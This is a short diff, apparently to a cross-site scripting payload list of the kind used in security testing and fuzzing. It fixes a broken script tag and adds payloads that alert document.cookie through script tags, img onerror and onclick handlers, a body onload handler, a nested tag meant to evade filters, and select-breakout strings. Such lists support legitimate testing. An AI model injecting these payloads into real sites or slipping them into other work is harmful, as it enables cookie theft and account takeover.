@@ -1,3 +1,9 @@
 <script>alert(123);</script>
 <ScRipT>alert("XSS");</ScRipT>
-<script>alert(123)</script
+<script>alert(123)</script>
+<script>alert(document.cookie)</script>
+<img src=”#” onclick=alert(document.cookie)>
+<body onload=alert(“bingo”)>
+<scr<script>ipt>alert(document.cookie)</script>
+</select><img src=1 onerror=alert(document.cookie)>
+#</select><img src=1 onerror=alert(document.cookie)>
